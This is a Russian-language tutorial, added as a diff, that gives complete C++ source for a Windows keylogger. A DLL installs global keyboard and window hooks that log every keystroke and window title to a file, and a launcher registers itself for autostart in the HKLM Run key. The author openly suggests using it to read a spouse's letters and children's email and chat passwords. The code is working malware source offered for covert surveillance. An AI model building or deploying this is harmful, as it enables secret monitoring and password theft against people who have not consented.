@@ -1,0 +1,232 @@
+§NAME: Клавиатурный шпион
+§AUTHOR: makedonskij
+§EMAIL: makedonskij@pisem.net
+
+Это еще один клавиатурный шпион.
+Программа пишет в файл с какими окнами работал и что в них писал наш подзащитный.
+Пишет на любом языке. 
+Можно узнать кому пишет любовные письма ваша жена(муж), пароли к почте и чату ваших детей.
+Но для профессионального шпионажа этого мало (не советую, могут башку отвернуть).
+Но тема наша научиться ставить ловушку(программную).
+Пример ставит две ловушки, одну на нажатие клавиш, другую на активирование или создание новых окон.
+
+Сначала создаем DLL c хуками:
+[code]// Hook.cpp : DLL-Project
+// 
+
+#include <windows.h>
+#include <stdio.h>
+
+#pragma data_seg(".hdata") // секция в памяти общая для всех процессов
+HINSTANCE hi=NULL; // эта переменная может изменяться любым поетому сдесь не должно быть ничего лишнего
+#pragma data_seg() // конец секции
+#pragma comment(linker, "/section:.hdata,rws") // даем права этой секции
+
+#ifdef __cplusplus 
+#define EXPORT extern "C" __declspec (dllexport) 
+#else 
+#define EXPORT __declspec (dllexport) 
+#endif 
+
+EXPORT BOOL SetKeyboardHook(void); // объявляем экспортируемую функцию
+
+// а эти будут у всех свои
+HANDLE hFile=NULL; // !!!!! хэндл файла для каждого процесса должен быть свой !!!!!
+HHOOK hKeyHook=NULL;
+HHOOK hCBTHook=NULL;
+
+void WriteTime(void) // записывает дату и время
+{
+    DWORD NOfBytes;
+    OVERLAPPED ovlp;
+    DWORD ffsze;
+    SYSTEMTIME time;
+    char buffer[30];
+
+    GetLocalTime(&time); // получаем дату и время
+// форматируем это в String
+    sprintf(buffer,"\r\n%02d.%02d.%d %02d:%02d",time.wDay,
+                    time.wMonth,time.wYear,time.wHour,time.wMinute);
+
+    ffsze=GetFileSize(hFile,NULL);
+    ovlp.OffsetHigh=0;
+    ovlp.hEvent=NULL;
+    ovlp.Offset=ffsze;
+
+    WriteFile(hFile,buffer,strlen(buffer),&NOfBytes,&ovlp); // пишем в файл
+}
+
+void WriteTitle(HWND hWnd) // записывает имя окна
+{
+    WriteTime(); // сначала пишем время
+    DWORD NOfBytes;
+    OVERLAPPED ovlp;
+    DWORD ffsze;
+    char buffer[250];
+    char title[256];
+    GetWindowText(hWnd,title,100); // получаем имя
+    sprintf(buffer," %s\r\n",title);
+    ffsze=GetFileSize(hFile,NULL);
+    ovlp.OffsetHigh=0;
+    ovlp.hEvent=NULL;
+    ovlp.Offset=ffsze;
+
+    WriteFile(hFile,buffer,strlen(buffer),&NOfBytes,&ovlp);
+}
+
+short GetSymbolFromVK(WPARAM wParam) // переводит код нажатой клавиши в текст
+{
+    BYTE btKeyState[256];
+    HKL hklLayout = GetKeyboardLayout(0); // узнаем язык клавиатуры
+    WORD Symbol; 
+    GetKeyboardState(btKeyState); 
+    if((ToAsciiEx(wParam, MapVirtualKey(wParam, 0), btKeyState, &Symbol, 0, hklLayout) == 1) && // сам перевод
+                 GetKeyState(VK_CONTROL) >= 0 && GetKeyState(VK_MENU) >= 0) // проверяем CTRL и ALT
+        return Symbol;
+     return -1;
+}
+
+void WriteSymbol(WPARAM wParam) // записывает нажатие в файл
+{
+    DWORD NOfBytes;
+    OVERLAPPED ovlp;
+    DWORD ffsze;
+    WORD wc;
+
+    ffsze=GetFileSize(hFile,NULL);
+    ovlp.OffsetHigh=0;
+    ovlp.hEvent=NULL;
+    ovlp.Offset=ffsze;
+
+    if(wParam==VK_RETURN) 
+        WriteFile(hFile,"\r\n",2,&NOfBytes,&ovlp);
+
+    else if((wc=GetSymbolFromVK(wParam))!=-1) // переводим нажатие в текст
+        if(iswprint(wc)) // проверяем или знак текстовой
+            WriteFile(hFile,&wc,1,&NOfBytes,&ovlp);
+}
+
+BOOL APIENTRY DllMain(HINSTANCE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)
+{
+    switch(ul_reason_for_call)
+     {
+        case DLL_PROCESS_ATTACH: // вызывается каждый раз когда новый процесс грузит DLL в свою память
+        {
+            if(!hi) // запоминаем запустивший хэндл(наша DLL) толко первый раз, чтобы он небыл переписан на новый
+                hi=hModule;
+            char pfad[MAX_PATH]; // путь к файлу должен быть обязательно полный, иначе каждый процесс
+                     // будет создавать новый в своем каталоге
+            GetModuleFileName(hi,pfad,MAX_PATH); // путь к нашей ДЛЛ
+            *(strrchr(pfad,'\\')+1)='\0'; // выкидываем ее имя
+            strcat(pfad,"KeySpy.txt"); // вставляем имя файла
+         // каждый процесс должен открыть для себя файл отдельно
+            if((hFile=CreateFile(pfad,GENERIC_READ|GENERIC_WRITE,
+                        FILE_SHARE_WRITE|FILE_SHARE_READ,NULL,
+                        OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL))==INVALID_HANDLE_VALUE)
+                    return FALSE;
+            break;
+        }
+
+         case DLL_PROCESS_DETACH:
+        { // Снимать хуки и закрывать файл необязательно 
+         // Система делает это автоматически
+         // UnhookWindowsHookEx(hKeyHook);
+         // UnhookWindowsHookEx(hCBTHook);
+         // CloseHandle(hFile);
+            break;
+        }
+        default:
+            break;
+    }
+    return TRUE ; 
+}
+
+LRESULT CALLBACK KeyboardProc(int nCode,WPARAM wParam,LPARAM lParam) // вызывается при нажатии или отпускании клавиши
+{
+    if (nCode)
+        return CallNextHookEx(hKeyHook,nCode,wParam,lParam);
+    if(lParam>=0) // нам нужно только нажатие
+        WriteSymbol(wParam);
+    return CallNextHookEx(hKeyHook,nCode,wParam,lParam);     // обработали передаем дальше
+}
+
+LRESULT WINAPI CBTProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    if(nCode==HCBT_ACTIVATE) // вызывается перед тем как система собирается активировать какоето окно или открыть новое
+            WriteTitle((HWND)wParam); // wParam новый HWND
+    return CallNextHookEx(hCBTHook, nCode, wParam, lParam); // обработали передаем дальше
+}
+
+BOOL SetKeyboardHook(void) // эту функцию надо вызывать из приложения для создания ловушек
+{
+    hKeyHook=SetWindowsHookEx(WH_KEYBOARD,&KeyboardProc,hi,0);
+    hCBTHook=SetWindowsHookEx(WH_CBT ,&CBTProc,hi,0);
+    return hKeyHook && hCBTHook;
+}
+// конец DLL[/code]
+Компилим, получаем hook.dll и hook.lib
+
+А это простое приложение:
+[code]// KeySpy.cpp 
+// 
+
+#include <windows.h>
+
+#ifdef __cplusplus
+#define IMPORT extern "C" __declspec (dllimport) 
+#else
+#define IMPORT __declspec (dllimport)
+#endif
+
+IMPORT BOOL SetKeyboardHook(void);     // функция импортируемая из DLL
+
+BOOL Mutex(LPSTR szName)     // проверяет запущена ли уже копия
+{
+    HANDLE hMutex = CreateMutex (NULL, TRUE, szName);
+    if (GetLastError() == ERROR_ALREADY_EXISTS)    
+    {
+        CloseHandle(hMutex);
+        return FALSE;     // уже запущена
+    }
+    return TRUE; // все путем
+}
+
+void Registry(void) // вписываем в автозапуск
+{
+    HKEY hKey = HKEY_LOCAL_MACHINE; 
+    LPCTSTR lpSubKey ="Software\\Microsoft\\Windows\\CurrentVersion\\Run"; 
+    DWORD dwType = REG_SZ;
+    HKEY key;
+    RegOpenKeyEx(hKey,lpSubKey,0,KEY_WRITE,&key);
+    char pfad[MAX_PATH];
+    GetModuleFileName(NULL,pfad,MAX_PATH);
+    RegSetValueEx(key,"KeySpy",0,REG_SZ,(LPBYTE)pfad,strlen(pfad));
+}
+
+int APIENTRY WinMain(HINSTANCE hInstance,
+            HINSTANCE hPrevInstance,
+            LPSTR lpCmdLine,
+            int nCmdShow )
+{
+    if(!Mutex("MySpy"))
+        return 1; // одна копия уже есть закрываемся
+
+    Registry();
+
+    if(!SetKeyboardHook()) // устанавливаем хуки
+        return 1; // не получилось закрываемся
+
+// а это бесконечный цикл
+    MSG msg;
+    while (GetMessage (&msg, NULL, 0, 0))
+    {
+         TranslateMessage (&msg);
+         DispatchMessage (&msg);
+    }
+    return 0;
+}[/code]
+Не забудьте включить в проект hook.lib и скопировать hook.dll к MySpy.exe.
+
+Ошибки в работе:
+При работе в Word повторяет букву 4 раза и если Windows не поддерживает русский интерфейс а окно называется по русски, то пишет ????????????????????????????.
+Но это другая тема
